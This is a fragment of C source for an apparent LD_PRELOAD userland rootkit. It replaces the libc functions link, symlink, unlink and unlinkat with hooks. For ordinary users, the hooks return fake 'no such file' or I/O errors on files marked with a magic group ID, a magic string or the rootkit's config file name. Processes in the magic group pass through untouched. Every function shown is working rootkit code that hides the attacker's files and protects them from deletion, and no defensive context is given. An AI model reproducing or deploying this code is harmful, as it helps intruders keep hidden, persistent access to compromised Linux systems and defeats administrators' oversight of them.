int link (const char *oldpath, const char *newpath) {
  struct stat s_fstat;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_link) old_link = dlsym(libc, "link");
  if(getgid() == MAGIC_GID) return old_link(oldpath,newpath);
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (_STAT_VER, oldpath, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID || (strstr (oldpath, MAGIC_STRING))
      || (strstr (oldpath, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }
  return old_link (oldpath,newpath);
}

int symlink (const char *oldpath, const char *newpath) {
  struct stat s_fstat;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_symlink) old_symlink = dlsym(libc, "symlink");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_symlink(oldpath,newpath);
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (_STAT_VER, oldpath, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID || (strstr (oldpath, MAGIC_STRING))) {
    errno = EIO;
    return -1;
  }
  return old_symlink (oldpath,newpath);
}

int unlink (const char *pathname) {
  struct stat s_fstat;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_unlink) old_unlink = dlsym(libc, "unlink");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_unlink(pathname);
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (_STAT_VER, pathname, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID || (strstr (pathname, MAGIC_STRING))
      || (strstr (pathname, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }
  return old_unlink (pathname);
}

int unlinkat (int dirfd, const char *pathname, int flags) {
  struct stat s_fstat;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_unlinkat) old_unlinkat = dlsym(libc, "unlinkat");
  if(getgid() == MAGIC_GID) return old_unlinkat(dirfd,pathname,flags);
  if (!old_fxstat) old_fxstat = dlsym(libc, "__fxstat");
  memset (&s_fstat, 0, sizeof (stat));
  old_fxstat (_STAT_VER, dirfd, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID || (strstr (pathname, MAGIC_STRING))
      || (strstr (pathname, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }
  return old_unlinkat (dirfd, pathname, flags);
}


